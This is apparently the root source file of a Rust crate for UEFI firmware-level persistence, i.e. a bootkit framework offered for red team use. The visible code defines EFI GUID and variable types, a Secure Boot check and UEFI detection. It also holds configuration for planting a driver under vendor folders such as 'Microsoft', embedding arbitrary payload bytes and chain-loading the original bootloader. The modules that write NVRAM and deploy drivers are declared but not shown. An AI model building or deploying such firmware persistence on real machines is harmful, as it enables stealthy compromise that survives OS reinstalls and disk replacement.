//! # UEFI Firmware-Level Persistence Framework
//!
//! **⚠️ AUTHORIZED RED TEAM USE ONLY ⚠️**
//!
//! This crate provides building blocks for UEFI firmware-level persistence that
//! survives OS reinstalls and disk replacement. It is intended **exclusively** for
//! authorized penetration testing and red team engagements where written
//! authorization has been obtained.
//!
//! ## Legal Disclaimer
//!
//! Unauthorized access to computer systems is illegal in most jurisdictions.
//! The authors assume no liability for misuse of this software. Users are
//! solely responsible for ensuring compliance with all applicable laws and
//! regulations. Always obtain written authorization before deploying these
//! techniques.
//!
//! ## Safety Guarantees
//!
//! - All NVRAM writes are validated before committing
//! - Original boot entries are backed up before modification
//! - Secure Boot status is checked; unsigned drivers are rejected if enabled
//! - No operation proceeds without verifying the target is a valid EFI system
//!
//! ## Modules
//!
//! - [`nvram`] — UEFI NVRAM variable read/write and boot entry management
//! - [`esp`] — EFI System Partition mounting and driver deployment
//! - [`driver_stub`] — Minimal EFI application PE/COFF stub builder
//! - [`runtime_driver`] — DXE runtime driver and firmware capsule support
//! - [`cleanup`] — Detection of existing persistence artifacts and removal

#![allow(dead_code)]
#![allow(unused_variables)]
#![allow(unused_imports)]

pub mod cleanup;
pub mod driver_stub;
pub mod esp;
pub mod nvram;
pub mod runtime_driver;

use serde::{Deserialize, Serialize};
use std::fmt;

/// EFI GUID representation (mixed-endian as per UEFI spec).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct EfiGuid {
    /// Data1 (little-endian u32).
    pub data1: u32,
    /// Data2 (little-endian u16).
    pub data2: u16,
    /// Data3 (little-endian u16).
    pub data3: u16,
    /// Data4 (big-endian, 8 bytes).
    pub data4: [u8; 8],
}

impl EfiGuid {
    /// EFI_GLOBAL_VARIABLE GUID: `{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}`
    pub const EFI_GLOBAL_VARIABLE: EfiGuid = EfiGuid {
        data1: 0x8BE4DF61,
        data2: 0x93CA,
        data3: 0x11D2,
        data4: [0xAA, 0x0D, 0x00, 0xE0, 0x98, 0x03, 0x2B, 0x8C],
    };

    /// EFI_CERT_TYPE_PKCS7_GUID: `{4Aafd29d-68df-49ee-8aa9-347d732e0423}`
    pub const EFI_CERT_TYPE_PKCS7: EfiGuid = EfiGuid {
        data1: 0x4AAFD29D,
        data2: 0x68DF,
        data3: 0x49EE,
        data4: [0x8A, 0xA9, 0x34, 0x7D, 0x73, 0x2E, 0x04, 0x23],
    };

    /// Construct a GUID from its component parts.
    pub const fn from_parts(data1: u32, data2: u16, data3: u16, data4: &[u8; 8]) -> EfiGuid {
        EfiGuid {
            data1,
            data2,
            data3,
            data4: *data4,
        }
    }

    /// Convert the GUID to a 16-byte mixed-endian byte array (as stored in EFI structures).
    pub fn to_bytes(&self) -> [u8; 16] {
        let mut bytes = [0u8; 16];
        bytes[0..4].copy_from_slice(&self.data1.to_le_bytes());
        bytes[4..6].copy_from_slice(&self.data2.to_le_bytes());
        bytes[6..8].copy_from_slice(&self.data3.to_le_bytes());
        bytes[8..16].copy_from_slice(&self.data4);
        bytes
    }

    /// Parse a GUID from the standard string format: `"8BE4DF61-93CA-11D2-AA0D-00E098032B8C"`.
    pub fn parse(s: &str) -> anyhow::Result<Self> {
        let parts: Vec<&str> = s.split('-').collect();
        if parts.len() != 5 {
            anyhow::bail!("Invalid GUID format: expected 5 dash-separated parts");
        }
        if parts[0].len() != 8 || parts[1].len() != 4 || parts[2].len() != 4 {
            anyhow::bail!("Invalid GUID format: wrong part lengths");
        }
        let data4_hex = format!("{}{}", parts[3], parts[4]);
        if data4_hex.len() != 16 {
            anyhow::bail!("Invalid GUID format: data4 wrong length");
        }
        Ok(EfiGuid {
            data1: u32::from_str_radix(parts[0], 16)?,
            data2: u16::from_str_radix(parts[1], 16)?,
            data3: u16::from_str_radix(parts[2], 16)?,
            data4: {
                let mut arr = [0u8; 8];
                for i in 0..8 {
                    arr[i] = u8::from_str_radix(&data4_hex[i * 2..i * 2 + 2], 16)?;
                }
                arr
            },
        })
    }

    /// Format the GUID as a standard string.
    pub fn to_string(&self) -> String {
        format!(
            "{:08X}-{:04X}-{:04X}-{:02X}{:02X}-{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}",
            self.data1,
            self.data2,
            self.data3,
            self.data4[0],
            self.data4[1],
            self.data4[2],
            self.data4[3],
            self.data4[4],
            self.data4[5],
            self.data4[6],
            self.data4[7],
        )
    }
}

impl fmt::Display for EfiGuid {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.to_string())
    }
}

/// EFI variable attributes (bitfield).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub struct EfiVarAttributes(pub u32);

impl EfiVarAttributes {
    /// Variable is preserved across system resets (non-volatile).
    pub const NON_VOLATILE: u32 = 0x00000001;
    /// Variable is accessible during Boot Services.
    pub const BOOTSERVICE_ACCESS: u32 = 0x00000002;
    /// Variable is accessible during Runtime Services.
    pub const RUNTIME_ACCESS: u32 = 0x00000004;
    /// Variable is hardware error record.
    pub const HARDWARE_ERROR_RECORD: u32 = 0x00000008;
    /// Variable is authenticated (Secure Boot).
    pub const AUTHENTICATED_WRITE_ACCESS: u32 = 0x00000010;
    /// Time-based authenticated variable.
    pub const TIME_BASED_AUTHENTICATED_WRITE_ACCESS: u32 = 0x00000020;
    /// Append-only write.
    pub const APPEND_WRITE: u32 = 0x00000040;
    /// Enhanced authenticated access.
    pub const ENHANCED_AUTHENTICATED_ACCESS: u32 = 0x00000080;

    /// Standard attributes for a boot variable: non-volatile + boot + runtime.
    pub const STANDARD_BOOT: EfiVarAttributes =
        EfiVarAttributes(Self::NON_VOLATILE | Self::BOOTSERVICE_ACCESS | Self::RUNTIME_ACCESS);

    /// Default attributes for custom variables.
    pub const DEFAULT: EfiVarAttributes =
        EfiVarAttributes(Self::NON_VOLATILE | Self::BOOTSERVICE_ACCESS | Self::RUNTIME_ACCESS);
}

impl fmt::Display for EfiVarAttributes {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let mut flags = Vec::new();
        if self.0 & Self::NON_VOLATILE != 0 {
            flags.push("NON_VOLATILE");
        }
        if self.0 & Self::BOOTSERVICE_ACCESS != 0 {
            flags.push("BOOTSERVICE_ACCESS");
        }
        if self.0 & Self::RUNTIME_ACCESS != 0 {
            flags.push("RUNTIME_ACCESS");
        }
        if self.0 & Self::HARDWARE_ERROR_RECORD != 0 {
            flags.push("HARDWARE_ERROR_RECORD");
        }
        if self.0 & Self::AUTHENTICATED_WRITE_ACCESS != 0 {
            flags.push("AUTHENTICATED_WRITE_ACCESS");
        }
        if self.0 & Self::TIME_BASED_AUTHENTICATED_WRITE_ACCESS != 0 {
            flags.push("TIME_BASED_AUTHENTICATED_WRITE_ACCESS");
        }
        write!(f, "0x{:08X} [{}]", self.0, flags.join(" | "))
    }
}

/// A parsed EFI boot entry (EFI_LOAD_OPTION).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BootEntry {
    /// Boot entry number (e.g., 0x0001 for "Boot0001").
    pub entry_number: u16,
    /// Human-readable description of the boot entry.
    pub description: String,
    /// Device path in text form (parsed from EFI_DEVICE_PATH).
    pub device_path: String,
    /// Optional data appended after the device path (often empty).
    pub optional_data: Vec<u8>,
    /// Whether this entry is currently active (load_option_active flag).
    pub is_active: bool,
    /// Raw bytes of the entire EFI_LOAD_OPTION.
    pub raw: Vec<u8>,
}

/// Configuration for the boot kit stub.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BootKitConfig {
    /// Vendor directory name on the ESP (e.g., "Microsoft", "Boot", "Intel").
    pub vendor_name: String,
    /// EFI driver filename (without .efi extension).
    pub driver_name: String,
    /// Boot entry number to modify (None = create new entry).
    pub target_entry: Option<u16>,
    /// Boot loader type on this system.
    pub bootloader_type: BootloaderType,
}

/// Detected boot loader type.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum BootloaderType {
    /// Windows Boot Manager (BCD).
    WindowsBcd,
    /// GRUB2.
    Grub2,
    /// systemd-boot.
    SystemdBoot,
    /// rEFInd.
    Refind,
    /// Unknown or unsupported.
    Unknown,
}

/// Configuration for the EFI payload stub builder.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EfiPayloadConfig {
    /// Payload bytes to embed in the .rdata section.
    ///
    /// EFI PE/COFF images are launched via BootServices->LoadImage/StartImage.
    /// Non-PE raw payloads are copied into EFI_LOADER_CODE pages and entered at
    /// `entry_point_offset`.
    pub payload_data: Vec<u8>,
    /// Path to a second-stage EFI driver on the ESP to load.
    pub second_stage_path: String,
    /// Offset within the payload to jump to as entry point.
    pub entry_point_offset: u32,
    /// Whether to chain-load the original bootloader after the payload.
    pub chain_to_original: bool,
    /// Path to the original bootloader on the ESP (for chain-loading).
    pub original_bootloader_path: String,
}

/// A detected UEFI persistence artifact.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistenceArtifact {
    /// Type of artifact detected.
    pub artifact_type: PersistenceArtifactType,
    /// Human-readable description.
    pub description: String,
    /// Location/path of the artifact.
    pub path: String,
    /// Risk level: info, low, medium, high, critical.
    pub risk_level: String,
    /// Whether the artifact can be safely removed.
    pub removable: bool,
}

/// Types of UEFI persistence artifacts.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PersistenceArtifactType {
    /// Unexpected boot entry pointing to a non-standard EFI driver.
    BootEntry,
    /// EFI driver found in a non-standard location on the ESP.
    EfiDriver,
    /// Modified EFI variable.
    NvramVariable,
    /// Bootloader configuration modification.
    BootloaderConfig,
    /// UEFI capsule artifact.
    CapsuleArtifact,
    /// DXE driver staged in firmware NVRAM.
    DxeDriver,
}

/// Secure Boot status.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SecureBootStatus {
    /// Secure Boot is enabled and enforced.
    Enabled,
    /// Secure Boot is disabled.
    Disabled,
    /// Secure Boot is supported but setup mode (not yet configured).
    SetupMode,
    /// Unable to determine Secure Boot status.
    Unknown,
}

/// Check the current Secure Boot status.
pub fn check_secure_boot_status() -> SecureBootStatus {
    // Read the SecureBoot EFI variable (8-byte header + 1-byte value).
    match nvram::read_efi_variable("SecureBoot", &EfiGuid::EFI_GLOBAL_VARIABLE) {
        Ok(data) => {
            // Linux efivars: first 4 bytes are attributes, then the value.
            // Windows GetFirmwareEnvironmentVariableA: raw value only.
            if data.len() >= 1 {
                let val = data[data.len() - 1];
                if val == 1 {
                    SecureBootStatus::Enabled
                } else {
                    SecureBootStatus::Disabled
                }
            } else {
                SecureBootStatus::Unknown
            }
        }
        Err(_) => {
            // Variable may not exist on systems without Secure Boot support.
            // Try SetupMode to distinguish.
            match nvram::read_efi_variable("SetupMode", &EfiGuid::EFI_GLOBAL_VARIABLE) {
                Ok(data) if data.len() >= 1 && data[data.len() - 1] == 1 => {
                    SecureBootStatus::SetupMode
                }
                _ => SecureBootStatus::Unknown,
            }
        }
    }
}

/// Validate that the current system is running UEFI firmware (not legacy BIOS).
pub fn is_uefi_system() -> bool {
    #[cfg(target_os = "linux")]
    {
        std::path::Path::new("/sys/firmware/efi").exists()
    }
    #[cfg(target_os = "windows")]
    {
        // On Windows, try to read a known EFI variable.
        // GetFirmwareEnvironmentVariableA requires SeSystemEnvironmentPrivilege
        // but if the function exists and doesn't return ERROR_INVALID_FUNCTION,
        // the system is UEFI.
        nvram::read_efi_variable("SecureBoot", &EfiGuid::EFI_GLOBAL_VARIABLE).is_ok()
            || nvram::read_efi_variable("Timeout", &EfiGuid::EFI_GLOBAL_VARIABLE).is_ok()
    }
    #[cfg(target_os = "macos")]
    {
        // On macOS, Intel Macs use UEFI firmware and expose EFI variables
        // through /usr/sbin/nvram.  Apple Silicon Macs use iBoot and do not
        // expose standard EFI variables — UEFI persistence does not apply there.
        //
        // Probe strategy: try to read a well-known EFI global variable via
        // nvram.  If it succeeds, this is an Intel Mac with UEFI.  If it fails
        // (or nvram is not present), report false.
        if !std::path::Path::new("/usr/sbin/nvram").exists() {
            return false;
        }
        nvram::read_efi_variable("BootOrder", &EfiGuid::EFI_GLOBAL_VARIABLE).is_ok()
            || nvram::read_efi_variable("Timeout", &EfiGuid::EFI_GLOBAL_VARIABLE).is_ok()
    }
    #[cfg(not(any(target_os = "linux", target_os = "windows", target_os = "macos")))]
    {
        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn efi_guid_parse_roundtrip() {
        let guid_str = "8BE4DF61-93CA-11D2-AA0D-00E098032B8C";
        let guid = EfiGuid::parse(guid_str).unwrap();
        assert_eq!(guid.data1, 0x8BE4DF61);
        assert_eq!(guid.data2, 0x93CA);
        assert_eq!(guid.data3, 0x11D2);
        assert_eq!(guid.data4, [0xAA, 0x0D, 0x00, 0xE0, 0x98, 0x03, 0x2B, 0x8C]);
        assert_eq!(guid.to_string(), guid_str);
    }

    #[test]
    fn efi_guid_parse_rejects_invalid() {
        assert!(EfiGuid::parse("invalid").is_err());
        assert!(EfiGuid::parse("8BE4DF61-93CA-11D2-AA0D").is_err());
        assert!(EfiGuid::parse("8BE4DF61-93CA-11D2-AA0D-00E098032B8").is_err());
    }

    #[test]
    fn efi_guid_global_variable_constant() {
        let gv = EfiGuid::EFI_GLOBAL_VARIABLE;
        assert_eq!(gv.to_string(), "8BE4DF61-93CA-11D2-AA0D-00E098032B8C");
    }

    #[test]
    fn efi_var_attributes_standard_boot() {
        let attrs = EfiVarAttributes::STANDARD_BOOT;
        assert_eq!(attrs.0, 0x00000007);
        assert!(attrs.0 & EfiVarAttributes::NON_VOLATILE != 0);
        assert!(attrs.0 & EfiVarAttributes::BOOTSERVICE_ACCESS != 0);
        assert!(attrs.0 & EfiVarAttributes::RUNTIME_ACCESS != 0);
    }

    #[test]
    fn efi_var_attributes_display() {
        let attrs = EfiVarAttributes::STANDARD_BOOT;
        let s = format!("{attrs}");
        assert!(s.contains("NON_VOLATILE"));
        assert!(s.contains("BOOTSERVICE_ACCESS"));
        assert!(s.contains("RUNTIME_ACCESS"));
    }

    #[test]
    fn secure_boot_status_serialization() {
        let status = SecureBootStatus::Enabled;
        let json = serde_json::to_string(&status).unwrap();
        assert_eq!(json, "\"enabled\"");
    }

    #[test]
    fn bootloader_type_serialization() {
        let bt = BootloaderType::WindowsBcd;
        let json = serde_json::to_string(&bt).unwrap();
        assert_eq!(json, "\"windows_bcd\"");
    }

    #[test]
    fn persistence_artifact_type_roundtrip() {
        let types = vec![
            PersistenceArtifactType::BootEntry,
            PersistenceArtifactType::EfiDriver,
            PersistenceArtifactType::NvramVariable,
            PersistenceArtifactType::BootloaderConfig,
            PersistenceArtifactType::CapsuleArtifact,
            PersistenceArtifactType::DxeDriver,
        ];
        for t in types {
            let json = serde_json::to_string(&t).unwrap();
            let parsed: PersistenceArtifactType = serde_json::from_str(&json).unwrap();
            assert_eq!(t, parsed);
        }
    }

    #[test]
    fn efi_guid_to_bytes() {
        let guid = EfiGuid::EFI_GLOBAL_VARIABLE;
        let bytes = guid.to_bytes();
        assert_eq!(bytes.len(), 16);
        // data1 should be little-endian.
        assert_eq!(&bytes[0..4], &0x8BE4DF61u32.to_le_bytes());
    }

    #[test]
    fn efi_guid_from_parts() {
        let guid = EfiGuid::from_parts(
            0x12345678,
            0x9ABC,
            0xDEF0,
            &[0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88],
        );
        assert_eq!(guid.data1, 0x12345678);
        assert_eq!(guid.data2, 0x9ABC);
    }
}
